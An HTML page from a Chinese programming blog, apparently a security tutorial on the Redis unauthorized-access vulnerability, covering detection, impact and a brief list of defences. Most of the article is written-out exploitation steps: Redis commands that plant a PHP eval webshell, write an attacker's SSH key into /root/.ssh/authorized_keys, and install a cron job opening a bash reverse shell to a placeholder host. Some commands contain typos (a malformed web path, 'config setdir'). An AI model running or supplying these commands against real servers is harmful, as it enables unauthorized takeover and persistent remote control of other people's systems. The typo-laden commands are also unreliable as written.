<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Redis未授权访问漏洞详解（全面） - 编程大咖</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://bcdaka.github.io/posts/58b95dac7111383e1124b88b2fed3b30/">
  <meta property="og:site_name" content="编程大咖">
  <meta property="og:title" content="Redis未授权访问漏洞详解（全面）">
  <meta property="og:description" content="这个漏洞造成原因是因为配置不当的问题，没有非常复杂的原理。这个漏洞一般位于内网之中，能利用好Redis漏洞往往能够顺利拿下服务器权限，所以也还是很重要的。
目录
Redis简单介绍
Redis未授权访问漏洞介绍
利用条件
影响版本
漏洞检测
漏洞危害
Redis写入webshell
原理
利用条件
利用过程
Redis写入SSH公钥
原理
利用条件
利用过程
Redis写入计划任务反弹shell
原理
利用条件
利用过程
Redis未授权访问漏洞防御
总结
Redis简单介绍 Redis是一款内存高速缓存的数据库，是一款K-V型数据库，它的所有键值都是用字典来存储的。其中它的value支持多种数据类型，包括String、List、Set、Zset和Hash。
Redis未授权访问漏洞介绍 利用条件 Redis默认情况下绑定在127.0.0.1:6379，在没有进行采用相关的策略，如添加防火墙规则避免其他非信任来源ip访问，就会将Redis服务暴露在公网上；并且Redis默认情况是空密码连接在服务器以root身份运行Redis时 这将导致任意用户可以访问目标服务器下未授权访问Redis以及读取Redis数据。
影响版本 Redis2.x-5.x
漏洞检测 一般使用nmap工具对目标机器进行扫描。如果发现主机的6379端口是对外开放的，并且目标主机开放外网访问的情况下，就能够在本机使用redis-cli服务连接目标服务器。
redis-cli -h 服务器ip 漏洞危害 攻击者无需通过认证就可以访问内部数据，导致敏感信息泄露攻击者可以恶意执行flushall来清空所有数据攻击者可通过eval执行lua代码，或通过数据备份功能往磁盘写入后门文件 eval()是用来执行一个字符串表达式，并返回表达式的值。
lua是一种脚本语言，用C语言编写，源码开放，其设计目的是为了嵌入程序应用，为应用程序提供便利的拓展功能。
由于Redis以root权限运行，攻击者可以给root账户写入SSH公钥文件，直接通过SSH登录目标服务器 Redis写入webshell 原理 Redis为了持久化连接，将数据保存在了本地。那么攻击者可以将后门代码作为value值，写入web目录下的.php文件，就可实现php的webshell。
利用条件 当存在未授权访问漏洞时，可以直接通过Redis连接靶机；如果靶机正好开启web服务；且攻击者知道了web目录的路径且该路径具有文件读写的权限。 这时候攻击者可以通过Redis写入webshell。
利用过程 以下为举例：
config set dir /var/www.html/ #切换到web写入目录 config set dbfilename zcc.php #设置写入木马的文件名 set xxx &#34;\n\n\n&lt;?php @eval($_POST[&#39;zcc&#39;]);?&gt;\n\n\n&#34; #写入恶意代码到内存中，这里的换行符是必要的，因为用Redis写入文件会自带一些版本信息，如果不换行可能执行不了 save #将内存中的数据导出到磁盘 Redis写入SSH公钥 原理 在Redis数据库中插入一条数据，将本机的公钥作为value，然后通过修改数据库的默认路径为/root/.ssh（ssh文件夹）和默认的缓冲文件authorized.keys（公钥文件），把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生成一个授权的key。
利用条件 通过漏洞成功连接Redis之后；且Redis服务以root权限执行；以及安全模式protected-mode处于关闭状态；服务器开启了ssh服务，且允许密钥登录。将密钥等配置信息存放在/root/.">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-05-28T15:20:22+08:00">
    <meta property="article:modified_time" content="2024-05-28T15:20:22+08:00">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大咖" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大咖</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Redis未授权访问漏洞详解（全面）</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p>这个漏洞造成原因是因为配置不当的问题，没有非常复杂的原理。这个漏洞一般位于内网之中，能利用好Redis漏洞往往能够顺利拿下服务器权限，所以也还是很重要的。</p> 
<p></p> 
<p id="main-toc"><strong>目录</strong></p> 
<p id="Redis%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D-toc" style="margin-left:0px;"><a href="#Redis%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D" rel="nofollow">Redis简单介绍</a></p> 
<p id="Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D-toc" style="margin-left:0px;"><a href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D" rel="nofollow">Redis未授权访问漏洞介绍</a></p> 
<p id="%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-toc" style="margin-left:40px;"><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6" rel="nofollow">利用条件</a></p> 
<p id="%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-toc" style="margin-left:40px;"><a href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC" rel="nofollow">影响版本</a></p> 
<p id="%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-toc" style="margin-left:40px;"><a href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B" rel="nofollow">漏洞检测</a></p> 
<p id="%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3-toc" style="margin-left:40px;"><a href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3" rel="nofollow">漏洞危害</a></p> 
<p id="Redis%E5%86%99%E5%85%A5webshell-toc" style="margin-left:0px;"><a href="#Redis%E5%86%99%E5%85%A5webshell" rel="nofollow">Redis写入webshell</a></p> 
<p id="%E5%8E%9F%E7%90%86-toc" style="margin-left:40px;"><a href="#%E5%8E%9F%E7%90%86" rel="nofollow">原理</a></p> 
<p id="%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-toc" style="margin-left:40px;"><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6" rel="nofollow">利用条件</a></p> 
<p id="%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B-toc" style="margin-left:40px;"><a href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B" rel="nofollow">利用过程</a></p> 
<p id="Redis%E5%86%99%E5%85%A5SSH%E5%85%AC%E9%92%A5-toc" style="margin-left:0px;"><a href="#Redis%E5%86%99%E5%85%A5SSH%E5%85%AC%E9%92%A5" rel="nofollow">Redis写入SSH公钥</a></p> 
<p id="%E5%8E%9F%E7%90%86-toc" style="margin-left:40px;"><a href="#%E5%8E%9F%E7%90%86" rel="nofollow">原理</a></p> 
<p id="%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-toc" style="margin-left:40px;"><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6" rel="nofollow">利用条件</a></p> 
<p id="%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B-toc" style="margin-left:40px;"><a href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B" rel="nofollow">利用过程</a></p> 
<p id="Redis%E5%86%99%E5%85%A5%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell-toc" style="margin-left:0px;"><a href="#Redis%E5%86%99%E5%85%A5%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell" rel="nofollow">Redis写入计划任务反弹shell</a></p> 
<p id="%E5%8E%9F%E7%90%86-toc" style="margin-left:40px;"><a href="#%E5%8E%9F%E7%90%86" rel="nofollow">原理</a></p> 
<p id="%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-toc" style="margin-left:40px;"><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6" rel="nofollow">利用条件</a></p> 
<p id="%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B-toc" style="margin-left:40px;"><a href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B" rel="nofollow">利用过程</a></p> 
<p id="Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1-toc" style="margin-left:0px;"><a href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1" rel="nofollow">Redis未授权访问漏洞防御</a></p> 
<p id="%E6%80%BB%E7%BB%93-toc" style="margin-left:0px;"><a href="#%E6%80%BB%E7%BB%93" rel="nofollow">总结</a></p> 
<hr id="hr-toc"> 
<p></p> 
<h2 id="Redis%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D">Redis简单介绍</h2> 
<p>Redis是一款内存高速缓存的数据库，是一款K-V型数据库，它的所有键值都是用字典来存储的。其中它的value支持多种数据类型，包括String、List、Set、Zset和Hash。</p> 
<p></p> 
<h2 id="Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D">Redis未授权访问漏洞介绍</h2> 
<h3 id="%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6">利用条件</h3> 
<ul><li>Redis默认情况下绑定在127.0.0.1:6379，在没有进行采用相关的策略，如添加防火墙规则避免其他非信任来源ip访问，就会将Redis服务暴露在公网上；</li><li>并且Redis默认情况是空密码连接</li><li>在服务器以root身份运行Redis时</li></ul> 
<p>这将导致任意用户可以访问目标服务器下未授权访问Redis以及读取Redis数据。</p> 
<p></p> 
<h3 id="%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC">影响版本</h3> 
<p>Redis2.x-5.x</p> 
<p></p> 
<h3 id="%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B">漏洞检测</h3> 
<p>一般使用nmap工具对目标机器进行扫描。如果发现主机的6379端口是对外开放的，并且目标主机开放外网访问的情况下，就能够在本机使用redis-cli服务连接目标服务器。</p> 
<pre><code>redis-cli -h 服务器ip</code></pre> 
<p></p> 
<h3 id="%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3">漏洞危害</h3> 
<ul><li>攻击者无需通过认证就可以访问内部数据，导致敏感信息泄露</li><li>攻击者可以恶意执行flushall来清空所有数据</li><li>攻击者可通过eval执行lua代码，或通过数据备份功能往磁盘写入后门文件</li></ul> 
<blockquote> 
 <p>eval()是用来执行一个字符串表达式，并返回表达式的值。</p> 
 <p>lua是一种脚本语言，用C语言编写，源码开放，其设计目的是为了嵌入程序应用，为应用程序提供便利的拓展功能。</p> 
</blockquote> 
<ul><li>由于Redis以root权限运行，攻击者可以给root账户写入SSH公钥文件，直接通过SSH登录目标服务器</li></ul> 
<p></p> 
<h2 id="Redis%E5%86%99%E5%85%A5webshell">Redis写入webshell</h2> 
<h3 id="%E5%8E%9F%E7%90%86">原理</h3> 
<p>Redis为了持久化连接，将数据保存在了本地。那么攻击者可以将后门代码作为value值，写入web目录下的.php文件，就可实现php的webshell。</p> 
<p></p> 
<h3>利用条件</h3> 
<ul><li>当存在未授权访问漏洞时，可以直接通过Redis连接靶机；</li><li>如果靶机正好开启web服务；</li><li>且攻击者知道了web目录的路径且该路径具有文件读写的权限。</li></ul> 
<p>这时候攻击者可以通过Redis写入webshell。</p> 
<p></p> 
<h3 id="%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B">利用过程</h3> 
<p>以下为举例：</p> 
<pre><code class="language-php">config set dir /var/www.html/        #切换到web写入目录
config set dbfilename zcc.php        #设置写入木马的文件名
set xxx "\n\n\n&lt;?php @eval($_POST['zcc']);?&gt;\n\n\n"        #写入恶意代码到内存中，这里的换行符是必要的，因为用Redis写入文件会自带一些版本信息，如果不换行可能执行不了
save        #将内存中的数据导出到磁盘</code></pre> 
<p></p> 
<h2 id="Redis%E5%86%99%E5%85%A5SSH%E5%85%AC%E9%92%A5">Redis写入SSH公钥</h2> 
<h3>原理</h3> 
<p>在Redis数据库中插入一条数据，将本机的公钥作为value，然后通过修改数据库的默认路径为/root/.ssh（ssh文件夹）和默认的缓冲文件authorized.keys（公钥文件），把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生成一个授权的key。</p> 
<p></p> 
<h3>利用条件</h3> 
<ul><li>通过漏洞成功连接Redis之后；</li><li>且Redis服务以root权限执行；</li><li>以及安全模式protected-mode处于关闭状态；</li><li>服务器开启了ssh服务，且允许密钥登录。将密钥等配置信息存放在/root/.ssh目录（安装了openssh只要将公钥放入到/root/.ssh文件夹中，无需设置默认就允许使用公钥登录），</li></ul> 
<p>即可远程写入一个公钥，直接登录远程服务器。</p> 
<p></p> 
<h3>利用过程</h3> 
<pre><code class="language-php">ssh-keygen -t rsa
config set dir /root/.ssh
config set dbfilename authorized_keys
set x "\n\n\nssh-rsa ...公钥...\n\n\n"
save</code></pre> 
<p>连接：</p> 
<pre><code class="language-php">ssh -i id_rsa root@ip</code></pre> 
<p></p> 
<h2 id="Redis%E5%86%99%E5%85%A5%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell">Redis写入计划任务反弹shell</h2> 
<h3>原理</h3> 
<p>在数据库中插入一条数据，将计划任务的内容作为value值，然后通过修改数据库的默认路径为目标主机计划任务的路径，把缓冲的数据保存在文件里，这样就可以一个计划任务进行反弹shell。</p> 
<p></p> 
<h3>利用条件</h3> 
<ul><li>能够远程连接到Redis</li><li>安全模式protectcd-mode处于关闭模式</li><li>以root权限运行</li></ul> 
<p></p> 
<h3>利用过程</h3> 
<pre><code class="language-php">set x "\n\n****bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/8089 0&gt;&amp;1 \n\n"
config setdir /var/spool/cron
config set dbfilename root
save</code></pre> 
<p></p> 
<h2 id="Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1">Redis未授权访问漏洞防御</h2> 
<ul><li>限制访问IP</li><li>修改默认端口</li><li>使用密码登录，限制密钥登录</li><li>不使用root运行Redis</li></ul> 
<p></p> 
<h2 id="%E6%80%BB%E7%BB%93" style="background-color:transparent;">总结</h2> 
<ul><li>Redis未授权访问漏洞是由于配置问题而产生的漏洞，因为没有改变默认端口6379且没有限制外来IP访问导致的漏洞。</li><li>Redis未授权漏洞一般可以用来写入webshell、写入ssh公钥进行登录、写入任务反弹shell连接</li><li>这些漏洞原理本质就是能够远程连接上Redis，且能够有root权限进行修改文件，然后将想要实现的内容写入就可以达成目的</li><li>Redis未授权漏洞的防御针对以上几点大概有：限制访问IP、修改默认端口、不使用密钥登录、不使用root权限运行Redis。</li></ul> 
<p></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/574323a2cf6044416644ac822a810ba5/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">python办公自动化——（二）替换PPT文档中图形数据-柱图</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/4c652abb2e6d63bd5bb59556f5779e80/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Leetcode：两数之和</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大咖.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>